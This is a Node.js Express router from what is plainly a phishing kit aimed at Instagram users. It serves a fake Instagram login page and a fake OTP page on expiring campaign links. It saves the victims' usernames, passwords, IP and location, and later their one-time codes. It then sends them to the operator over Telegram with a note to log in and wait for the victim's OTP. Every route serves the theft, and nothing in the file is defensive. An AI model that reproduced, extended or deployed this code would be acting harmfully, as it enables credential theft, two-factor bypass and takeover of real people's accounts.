const router = require("express").Router();
const Links = require("../../models/LinkModel");
const User = require("../../models/User");
const Credential = require("../../models/CredentialModel");
const bot = require("../../telegram");


router.get("/inst/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            console.log("here1")
            return res.redirect("/notfound");
        }
        // if ((req.hostname == req.app.hostname2) && !link.usLink) {
        //     console.log("here2")
        //     return res.redirect("/notfound");
        // }
        if (new Date() > new Date(link.expiry)) {
            console.log("here3")
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'INSTAGRAM') {
            console.log("here4")
            return res.redirect("/notfound");
        }
        return res.render("socials/instagram/instagram", { req, linkId, layout: false });
    } catch (err) {
        console.log(err)
    }
});

router.get("/inst/otp/:linkId", async (req, res) => {
    try {
        const { linkId } = req.params;
        const link = await Links.findOne({ _id: linkId });
        if (!link) {
            return res.redirect("/notfound");
        }
        if (new Date() > new Date(link.expiry)) {
            return res.redirect("/notfound");
        }
        if (linkId.length !== 24 || !link || link.linkType !== 'INSTAGRAM') {
            return res.redirect("/notfound");
        }
        return res.render("socials/instagram/instaOTP", { req, linkId, layout: false });
    } catch (err) {
        console.log(err);
    }
});

router.post("/inst/:linkId", async (req, res) => {
    try {
        const { username, password, country, city, region, ip } = req.body;
        const { linkId } = req.params;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findById(linkId);
        const user = await User.findById(link.user);

        if (link?.name) {
            const newCredential = new Credential({
                user: link.user,
                link: linkId,
                linkName: link.name,
                linkType: "Instagram",
                country,
                region,
                ip,
                city,
                fields: {
                    username,
                    password
                }
            });
            await newCredential.save();
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈

USERNAME: ${username}
PASSWORD: ${password}

PLATFORM: INSATGRAM
COUNTRY: ${country}
CITY: ${city}
REGION: ${region}
IP: ${ip}

${link.otpEnabled ? "Login and wait for victim to send OTP" : ""}

Login now: https://www.instagram.com
                                                `)
                .catch(err => console.log("Telegram error"));
            if (link.otpEnabled) {
                return res.redirect("/inst/otp/" + link.id);
            } else {
                return res.redirect("/successful-vote");
            }
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});

router.post("/inst/otp/:linkId", async (req, res) => {
    try {
        const { linkId, code } = req.body;
        if (linkId.length !== 24) {
            return res.redirect("/notfound");
        }
        const link = await Links.findById(linkId);
        const user = await User.findById(link.user);

        if (link) {
            await bot.sendMessage(user.telegramID, `
😈NEW ENTRY😈

PLATFORM: INSTAGRAM

OTP RECEIVED!

CODE: ${code}

                `)
                .catch(err => console.log("Telegram error"));
            return res.redirect("/successful-vote");
        }
        else {
            return res.redirect("/notfound");
        }
    } catch (err) {
        console.log(err)
    }
});


module.exports = router;